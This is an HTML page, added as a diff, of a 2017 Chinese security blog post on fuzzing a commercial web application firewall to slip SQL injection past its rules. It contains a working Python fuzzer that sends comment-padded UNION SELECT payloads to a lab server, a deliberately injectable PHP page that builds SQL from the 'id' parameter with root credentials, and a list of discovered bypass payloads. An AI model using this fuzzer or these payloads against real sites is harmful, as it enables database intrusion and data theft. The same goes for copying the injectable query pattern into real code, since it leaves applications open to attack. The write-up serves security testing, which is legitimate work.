@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta content="倾旋的博客" property="og:site_name">
+
+  <meta content="Fuzz 测试 WAF" property="og:title">
+
+
+  <meta content="article" property="og:type">
+
+
+  <meta content="本篇文章是总结 科拉实验室V1n3r的Fuzz bypass WAF的过程，由科拉实验室 倾旋 做内容补充。" property="og:description">
+
+
+  <meta content="http://localhost:4000/archivers/2017-06-02/1" property="og:url">
+
+
+  <meta content="2017-06-02T00:00:00+08:00" property="article:published_time">
+  <meta content="http://localhost:4000/about/" property="article:author">
+
+
+  <meta property="og:image" content="">
+
+
+  
+  <meta content="fuzz" property="article:section">
+  
+
+
+  
+
+  <title>Fuzz 测试 WAF</title>
+  <meta name="description" content="本篇文章是总结 科拉实验室V1n3r的Fuzz bypass WAF的过程，由科拉实验室 倾旋 做内容补充。">
+<script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min.js"></script>
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+  
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/ptsans.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firamono.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lato.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/sourcecodepro.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/gentiumbasic.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/alegreya.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lora.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firasans400.css' rel='stylesheet' type='text/css'>
+  <script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min2.2.0.js"></script>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/opensans.css' rel='stylesheet' type='text/css'>
+<link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-hQpvDQiCJaD2H465dQfA717v7lu5qHWtDbWNPvaTJ0ID5xnPUlVXnKzq7b8YUkbN" crossorigin="anonymous">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/archivers/2017-06-02/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+<section>
+<nav class="navbar navbar-default navbar-fixed-top">
+
+  <div class="container">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">倾旋的博客</a>
+    </div>
+
+
+    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+      <ul class="nav navbar-nav">
+        
+        
+        <li><a href="/about/">关于我</a></li>
+
+        
+
+        
+        
+        <li><a href="/category/">Category</a></li>
+
+        
+
+        
+        
+        <li><a href="/contact/">Contact</a></li>
+
+        
+
+        
+        
+
+        
+        
+
+        
+        
+
+        
+        
+        <li><a href="/other/">其他信息</a></li>
+
+        
+
+        
+        
+        <li><a href="/tools/socat">socat 使用手册</a></li>
+
+        
+
+        
+
+
+      </ul>
+
+    <!--  <ul class="nav navbar-nav navbar-right">
+        <li><a href="#">Know More!</a></li>
+
+      </ul>-->
+    </div><!-- /.navbar-collapse -->
+  </div><!-- /.container-fluid -->
+</nav>
+</section>
+
+<section>
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="jumbotron">
+    <div class="container">
+      <h1 class="post-title-main" itemprop="name headline">Fuzz 测试 WAF</h1>
+      <p class="post-meta"><time datetime="2017-06-02T00:00:00+08:00" itemprop="datePublished">Jun 2, 2017</time></p>
+      
+    </div>
+
+</div>
+
+
+  <div class="post-content container" itemprop="articleBody">
+    <p>本篇文章是总结 科拉实验室V1n3r的Fuzz bypass WAF的过程，由科拉实验室 倾旋 做内容补充。
+<!--more--></p>
+<h2 id="0x00-前言">0x00 前言</h2>
+<p>科拉实验室 是一个无名无实的信息安全实验室，此Git用于发布成员研究成果，技术交流而创。</p>
+
+<p>本篇文章是总结 科拉实验室V1n3r的Fuzz bypass WAF的过程，由科拉实验室 倾旋 做内容补充。</p>
+
+<p>参考文献：http://www.cnblogs.com/perl6/p/7076524.html</p>
+
+<p>环境如下：</p>
+<ul>
+  <li>Windows 2008</li>
+  <li>Apache</li>
+  <li>PHP</li>
+  <li>MySQL</li>
+  <li>某WAF 4.0</li>
+</ul>
+
+<h2 id="0x01-原理">0x01 原理</h2>
+
+<p>每当WAF拦截一个请求，都会返回一个相同的提示页面，这个页面可以给予我们与正常请求页面不同的响应。</p>
+
+<p>如：网页标题、网页内容、HTTP响应头、等等……</p>
+
+<p>那么在WAF匹配攻击敏感点的时候它会查询一下自己的规则库（正则表达式），如果遇到匹配不到的请求（正常请求 or 攻击请求），都会自动放行。</p>
+
+<p>首先要确立一个看似一定会被拦截的规则，然后在此规则上做FUZZ测试。</p>
+
+<p>例如：<code class="highlighter-rouge">UNION SELECT XXX</code></p>
+
+<p>但是我们在UNION与SELECT之间可以做许多注释来进行测试，假设规则库（正则）中只能匹配到数字、大小写字母，那么就可以填充它预知不到的字符，该请求被发送出去，都将会被视为正常请求放行。</p>
+
+<p>例如：<code class="highlighter-rouge">UNION/*%(-_/}%*/ SELECT</code></p>
+
+<p>当前状况下，<code class="highlighter-rouge">/**/</code>中的字符都不会被SQL解析。</p>
+
+<h2 id="0x02-机器实现对抗规则库">0x02 机器实现对抗规则库</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -*- coding: utf-8 -*-</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="n">fuzz_zs</span> <span class="o">=</span> <span class="p">[</span><span class="s">'/*'</span><span class="p">,</span><span class="s">'*/'</span><span class="p">,</span><span class="s">'/*!'</span><span class="p">,</span><span class="s">'*'</span><span class="p">,</span><span class="s">'='</span><span class="p">,</span><span class="s">'`'</span><span class="p">,</span><span class="s">'!'</span><span class="p">,</span><span class="s">'@'</span><span class="p">,</span><span class="s">'</span><span class="si">%</span><span class="s">'</span><span class="p">,</span><span class="s">'.'</span><span class="p">,</span><span class="s">'-'</span><span class="p">,</span><span class="s">'+'</span><span class="p">,</span><span class="s">'|'</span><span class="p">,</span><span class="s">'</span><span class="si">%00</span><span class="s">'</span><span class="p">]</span>
+<span class="n">fuzz_sz</span> <span class="o">=</span> <span class="p">[</span><span class="s">''</span><span class="p">,</span><span class="s">' '</span><span class="p">]</span>
+<span class="n">fuzz_ch</span> <span class="o">=</span> <span class="p">[</span><span class="s">"</span><span class="si">%0</span><span class="s">a"</span><span class="p">,</span><span class="s">"</span><span class="si">%0</span><span class="s">b"</span><span class="p">,</span><span class="s">"</span><span class="si">%0</span><span class="s">c"</span><span class="p">,</span><span class="s">"</span><span class="si">%0</span><span class="s">d"</span><span class="p">,</span><span class="s">"</span><span class="si">%0</span><span class="s">e"</span><span class="p">,</span><span class="s">"</span><span class="si">%0</span><span class="s">f"</span><span class="p">,</span><span class="s">"</span><span class="si">%0</span><span class="s">g"</span><span class="p">,</span><span class="s">"</span><span class="si">%0</span><span class="s">h"</span><span class="p">,</span><span class="s">"</span><span class="si">%0</span><span class="s">i"</span><span class="p">,</span><span class="s">"</span><span class="si">%0</span><span class="s">j"</span><span class="p">]</span>
+ <span class="c"># 这里还可以填充更多的冷门字符</span>
+<span class="n">fuzz</span> <span class="o">=</span> <span class="n">fuzz_zs</span><span class="o">+</span><span class="n">fuzz_sz</span><span class="o">+</span><span class="n">fuzz_ch</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"User-Agent"</span><span class="p">:</span><span class="s">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0"</span><span class="p">}</span>
+<span class="n">url_start</span> <span class="o">=</span> <span class="s">"http://192.168.1.104/index.php?id=1"</span>
+<span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">fuzz</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">fuzz</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">fuzz</span><span class="p">:</span>
+            <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">fuzz</span><span class="p">:</span>
+                    <span class="n">exp</span> <span class="o">=</span> <span class="s">"/*!union/*"</span><span class="o">+</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="n">d</span><span class="o">+</span><span class="s">"*/select*/ 1,2"</span>
+                    <span class="n">url</span> <span class="o">=</span> <span class="n">url_start</span> <span class="o">+</span> <span class="n">exp</span>
+                    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span> <span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">)</span>
+                    <span class="c">#print(res.text.find("true"))</span>
+                    <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">"true"</span><span class="p">)</span><span class="o">==-</span><span class="mi">1</span><span class="p">:</span>
+                        <span class="k">print</span><span class="p">(</span><span class="s">"Find Fuzz bypass:"</span><span class="o">+</span><span class="n">url</span><span class="p">)</span>
+                        <span class="k">pass</span>
+
+</code></pre></div></div>
+
+<p>服务器端代码：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">mysql_connect</span><span class="p">(</span><span class="s2">"127.0.0.1"</span><span class="p">,</span><span class="s2">"root"</span><span class="p">,</span><span class="s2">"root"</span><span class="p">,</span><span class="s2">"test"</span><span class="p">);</span>
+<span class="nv">$id</span><span class="o">=!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+<span class="nv">$SQL</span><span class="o">=</span><span class="s2">"SELECT * FROM test.test WHERE id = "</span> <span class="o">.</span> <span class="nv">$id</span><span class="p">;</span>
+<span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$SQL</span><span class="p">));</span>
+<span class="nb">print_r</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</code></pre></div></div>
+<p>数据库结构：</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-22/00.png" alt="数据库结构" title="数据库结构" /></p>
+
+<p>注意要将CC防护关闭，因为它会将短时间内请求数量过高的主机加入黑名单</p>
+
+<h2 id="0x03-just-do-it">0x03 Just Do it</h2>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-22/11.png" alt="fuzz" title="FUZZ结果" /></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Find Fuzz bypass:http://192.168.1.104/index.php?id=1/*!union/*/*/*%0h%0c*/select
+*/ 1,2
+Find Fuzz bypass:http://192.168.1.104/index.php?id=1/*!union/*/*/*%0h%0d*/select
+*/ 1,2
+Find Fuzz bypass:http://192.168.1.104/index.php?id=1/*!union/*/*/*%0h%0e*/select
+*/ 1,2
+Find Fuzz bypass:http://192.168.1.104/index.php?id=1/*!union/*/*/*%0h%0f*/select
+*/ 1,2
+Find Fuzz bypass:http://192.168.1.104/index.php?id=1/*!union/*/*/*%0h%0g*/select
+*/ 1,2
+Find Fuzz bypass:http://192.168.1.104/index.php?id=1/*!union/*/*/*%0h%0h*/select
+*/ 1,2
+Find Fuzz bypass:http://192.168.1.104/index.php?id=1/*!union/*/*/*%0h%0i*/select
+*/ 1,2
+Find Fuzz bypass:http://192.168.1.104/index.php?id=1/*!union/*/*/*%0h%0j*/select
+*/ 1,2
+Find Fuzz bypass:http://192.168.1.104/index.php?id=1/*!union/*/*/*%0i/**/select*
+/ 1,2
+Find Fuzz bypass:http://192.168.1.104/index.php?id=1/*!union/*/*/*%0i*/*/select*
+/ 1,2
+Find Fuzz bypass:http://192.168.1.104/index.php?id=1/*!union/*/*/*%0i/*!*/select
+*/ 1,2
+Find Fuzz bypass:http://192.168.1.104/index.php?id=1/*!union/*/*/*%0i**/select*/
+ 1,2
+ ..................
+</code></pre></div></div>
+
+<p>对抗结果如上</p>
+
+<p>利用如上Payloads写出响应的Tamper已经不是什么难事了。</p>
+
+<h2 id="0x04-未来">0x04 未来</h2>
+
+<p>目前是机器PK死的规则库，当然是机器会胜利，那么未来是否会是机器对抗机器？</p>
+
+<p>还会远吗？</p>
+
+<hr />
+
+<p>科拉实验室  service@cora-lab.org</p>
+
+
+  </div>
+
+</article>
+
+</section>
+<nav class="navbar navbar-default navbar-fixed-bottom">
+  <div class="container footer-content">
+    Copyright @ 2018 by 倾旋<br>
+    Powered By Jekyll
+  </div>
+</nav>
+
+  </body>
+
+</html>
